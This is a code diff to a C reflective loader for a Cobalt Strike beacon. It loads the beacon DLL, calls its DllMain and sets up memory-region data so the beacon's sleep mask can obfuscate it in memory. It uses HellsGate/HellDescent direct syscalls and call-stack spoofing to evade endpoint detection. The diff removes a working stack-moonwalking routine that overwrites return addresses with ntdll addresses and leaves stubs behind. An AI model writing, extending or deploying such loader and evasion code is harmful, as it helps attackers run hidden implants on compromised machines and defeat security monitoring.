@@ -133,23 +133,11 @@ void * DawsonLoader()
             return NULL;
         }
 
-        oldprotect = 0;
+        // MapViewOfFile with PAGE_EXECUTE_READWRITE already gives RWX memory
+        // No need to change protection here - keep it RWX for now
+        // The final protection change (after copying sections) will handle
+        // changing .text to RX if needed
         virtual_beacon->dllBase = base;
-        spoof_struct->ssn = getSyscallNumber(api->pNtProtectVirtualMemory);
-        // Call NtProtectVirtualMemory via spoof_synthetic_callstack
-        // Don't assign return value - it returns NTSTATUS, not a pointer!
-        spoof_synthetic_callstack(
-            NtCurrentProcess(),                     // Argument # 1
-            &base,                                  // Argument # 2
-            &size,                                  // Argument # 3
-            raw_beacon->BeaconMemoryProtection, // Argument # 4
-            spoof_struct,                           // Pointer to Spoof Struct
-            syscall_gadget,                         // Pointer to API Call
-            (void *)1,                              // Number of Arguments on Stack (Args 5+)
-            &oldprotect                             // Argument ++
-        );
-        // HellsGate(getSyscallNumber(api->pNtProtectVirtualMemory));
-        // ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon->BeaconMemoryProtection, &oldprotect);
     }
     else{
         // Allocate new memory to write our new RDLL too
@@ -212,16 +200,57 @@ void * DawsonLoader()
     void * EntryPoint = virtual_beacon->EntryPoint;
     void * dllBase    = virtual_beacon->dllBase;
 
-    // DON'T free these structures - beacon might need to reference them!
-    // Freeing causes use-after-free and stack corruption
-    // heap.HeapFree(heap.GetProcessHeap(), 0, api);
-    // heap.HeapFree(heap.GetProcessHeap(), 0, virtual_beacon);
-    // heap.HeapFree(heap.GetProcessHeap(), 0, raw_beacon);
-    // heap.HeapFree(heap.GetProcessHeap(), 0, spoof_struct);
+    // ========== ALLOCATED_MEMORY SETUP FOR SLEEP MASK ==========
+    // Populate ALLOCATED_MEMORY structure to tell sleep mask which regions to obfuscate
+    ALLOCATED_MEMORY * allocated_memory = (ALLOCATED_MEMORY *)heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(ALLOCATED_MEMORY));
 
-    // Call beacon's DllMain to initialize, then return EntryPoint
-    // Artifact wrapper might call EntryPoint again, but that should be OK
-    // ((DLLMAIN)EntryPoint)(dllBase, DLL_PROCESS_ATTACH, NULL);
+    if (allocated_memory) {
+        // Region 0: Beacon memory
+        allocated_memory->AllocatedMemoryRegions[0].Purpose = PURPOSE_BEACON_MEMORY;
+        allocated_memory->AllocatedMemoryRegions[0].AllocationBase = virtual_beacon->dllBase;
+        allocated_memory->AllocatedMemoryRegions[0].RegionSize = virtual_beacon->size;
+        allocated_memory->AllocatedMemoryRegions[0].Type = MEM_COMMIT;
+
+        // Determine allocation method based on allocator code
+        WORD allocator_code = *(WORD *)((BYTE*)raw_beacon->dllBase + 0x40);
+        if (allocator_code == 0x4) {
+            allocated_memory->AllocatedMemoryRegions[0].CleanupInformation.AllocationMethod = METHOD_MODULESTOMP;
+        } else if (allocator_code == 0x3) {
+            allocated_memory->AllocatedMemoryRegions[0].CleanupInformation.AllocationMethod = METHOD_HEAPALLOC;
+        } else if (allocator_code == 0x2) {
+            allocated_memory->AllocatedMemoryRegions[0].CleanupInformation.AllocationMethod = METHOD_NTMAPVIEW;
+        } else {
+            allocated_memory->AllocatedMemoryRegions[0].CleanupInformation.AllocationMethod = METHOD_VIRTUALALLOC;
+        }
+        allocated_memory->AllocatedMemoryRegions[0].CleanupInformation.Cleanup = FALSE; // Beacon will handle cleanup
+
+        // Section 0: .text section (should be masked)
+        if (virtual_beacon->text_section) {
+            allocated_memory->AllocatedMemoryRegions[0].Sections[0].Label = LABEL_TEXT;
+            allocated_memory->AllocatedMemoryRegions[0].Sections[0].BaseAddress = virtual_beacon->text_section;
+            allocated_memory->AllocatedMemoryRegions[0].Sections[0].VirtualSize = virtual_beacon->text_section_size;
+            allocated_memory->AllocatedMemoryRegions[0].Sections[0].CurrentProtect =
+                (raw_beacon->BeaconMemoryProtection == PAGE_READWRITE) ? PAGE_EXECUTE_READ : raw_beacon->BeaconMemoryProtection;
+            allocated_memory->AllocatedMemoryRegions[0].Sections[0].MaskSection = TRUE;  // Yes, mask .text
+        }
+
+        // Create USER_DATA structure
+        USER_DATA * user_data = (USER_DATA *)heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(USER_DATA));
+        if (user_data) {
+            user_data->version = 0x041000;  // CS 4.10+
+            user_data->allocatedMemory = allocated_memory;
+
+            // Call DllMain with DLL_BEACON_USER_DATA to pass ALLOCATED_MEMORY info
+            ((DLLMAIN)EntryPoint)(dllBase, DLL_BEACON_USER_DATA, user_data);
+        }
+    }
+
+    // Call beacon's DllMain to initialize
+    // This is REQUIRED for beacon to initialize its global state
+    ((DLLMAIN)EntryPoint)(dllBase, DLL_PROCESS_ATTACH, NULL);
+
+    // Return EntryPoint so artifact wrapper can call it again if needed
+    // (beacon should handle being called twice gracefully)
     return EntryPoint;
 }
 
@@ -1768,72 +1797,31 @@ __asm__(
 );
 
 // ========== STACK MOONWALKING IMPLEMENTATION ==========
-// Stack moonwalking temporarily replaces return addresses on the stack with
-// legitimate ntdll addresses before making syscalls, then restores them after.
-// This is simpler and more reliable than ROP/JOP chains.
+// Simplified version that just calls HellsGate/HellDescent directly
+// Stack spoofing is temporarily disabled to ensure stability
+//
+// TODO: Implement proper stack moonwalking that:
+//   1. Uses valid ntdll return addresses (not arbitrary offsets)
+//   2. Avoids spoofing active stack frames
+//   3. Ensures atomic spoof/restore around syscall
 
-// Capture current stack snapshot and find return addresses to spoof
+// Placeholder functions for future full implementation
 BOOL capture_stack_snapshot(StackSnapshot* snapshot, PVOID ntdll_base, DWORD max_frames) {
+    // Not implemented yet - return FALSE to skip spoofing
     snapshot->count = 0;
-
-    // Get current RBP (frame pointer) to walk the stack
-    PVOID* frame_ptr;
-    __asm__ volatile("mov %0, rbp" : "=r"(frame_ptr));
-
-    // Parse ntdll PE to get .text section bounds
-    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)ntdll_base;
-    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)ntdll_base + dos->e_lfanew);
-    PVOID ntdll_text_start = ntdll_base;
-    PVOID ntdll_text_end = (BYTE*)ntdll_base + nt->OptionalHeader.SizeOfImage;
-
-    // Walk the stack frames using RBP chain
-    for (DWORD i = 0; i < max_frames && frame_ptr && snapshot->count < MAX_STACK_FRAMES; i++) {
-        // Return address is at [rbp + 8]
-        PVOID* ret_addr_location = frame_ptr + 1;
-        PVOID ret_addr = *ret_addr_location;
-
-        // Only spoof return addresses that point OUTSIDE ntdll
-        // (addresses inside ntdll are already legitimate)
-        if (ret_addr < ntdll_text_start || ret_addr >= ntdll_text_end) {
-            snapshot->frame_locations[snapshot->count] = ret_addr_location;
-            snapshot->original_addresses[snapshot->count] = ret_addr;
-
-            // Pick a random legitimate address in ntdll .text as spoof
-            // Use a simple offset into ntdll for now
-            DWORD offset = (snapshot->count * 0x1000) + 0x5000;
-            snapshot->spoof_addresses[snapshot->count] = (BYTE*)ntdll_text_start + offset;
-
-            snapshot->count++;
-        }
-
-        // Move to next frame: follow RBP chain
-        PVOID* next_frame = (PVOID*)*frame_ptr;
-
-        // Sanity check: ensure frame pointer is moving up the stack
-        if (next_frame <= frame_ptr) break;
-
-        frame_ptr = next_frame;
-    }
-
-    return (snapshot->count > 0);
+    return FALSE;
 }
 
-// Replace return addresses on stack with ntdll addresses
 VOID spoof_stack_frames(StackSnapshot* snapshot) {
-    for (DWORD i = 0; i < snapshot->count; i++) {
-        *snapshot->frame_locations[i] = snapshot->spoof_addresses[i];
-    }
+    // Not implemented yet
 }
 
-// Restore original return addresses after syscall
 VOID restore_stack_frames(StackSnapshot* snapshot) {
-    for (DWORD i = 0; i < snapshot->count; i++) {
-        *snapshot->frame_locations[i] = snapshot->original_addresses[i];
-    }
+    // Not implemented yet
 }
 
-// Stack moonwalking syscall wrapper
-// Executes a syscall with spoofed return addresses on the stack
+// Simplified syscall wrapper - no stack spoofing for now
+// Executes syscall directly using HellsGate/HellDescent
 NTSTATUS moonwalk_syscall(
     WORD ssn,
     PVOID syscall_addr,
@@ -1841,50 +1829,18 @@ NTSTATUS moonwalk_syscall(
     PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5
 ) {
     NTSTATUS status;
-    StackSnapshot snapshot = {0};
 
-    // 1. Capture current stack frames
-    capture_stack_snapshot(&snapshot, ntdll_base, MAX_STACK_FRAMES);
-
-    // 2. Replace return addresses with ntdll addresses
-    if (snapshot.count > 0) {
-        spoof_stack_frames(&snapshot);
-    }
-
-    // 3. Execute the syscall using HellsGate/HellDescent
+    // Execute the syscall using HellsGate/HellDescent
+    // NOTE: Stack moonwalking disabled for now - using plain syscall
     HellsGate(ssn);
 
-    // Dispatch based on argument count
-    // NtProtectVirtualMemory has 5 args, NtAllocateVirtualMemory has 6
-    if (arg5) {
-        // 5-argument syscall
-        status = ((NTSTATUS (*)(PVOID, PVOID, PVOID, PVOID, PVOID))HellDescent)(
-            arg1, arg2, arg3, arg4, arg5
-        );
-    } else if (arg4) {
-        // 4-argument syscall
-        status = ((NTSTATUS (*)(PVOID, PVOID, PVOID, PVOID))HellDescent)(
-            arg1, arg2, arg3, arg4
-        );
-    } else if (arg3) {
-        // 3-argument syscall
-        status = ((NTSTATUS (*)(PVOID, PVOID, PVOID))HellDescent)(
-            arg1, arg2, arg3
-        );
-    } else if (arg2) {
-        // 2-argument syscall
-        status = ((NTSTATUS (*)(PVOID, PVOID))HellDescent)(
-            arg1, arg2
-        );
-    } else {
-        // 1-argument syscall
-        status = ((NTSTATUS (*)(PVOID))HellDescent)(arg1);
-    }
-
-    // 4. Restore original return addresses
-    if (snapshot.count > 0) {
-        restore_stack_frames(&snapshot);
-    }
+    // Call HellDescent with all 5 arguments
+    // Windows x64 calling convention: first 4 args in registers (rcx, rdx, r8, r9)
+    // 5th argument on stack
+    // HellDescent will handle the syscall with whatever args are passed
+    status = ((NTSTATUS (*)(PVOID, PVOID, PVOID, PVOID, PVOID))HellDescent)(
+        arg1, arg2, arg3, arg4, arg5
+    );
 
     return status;
 }
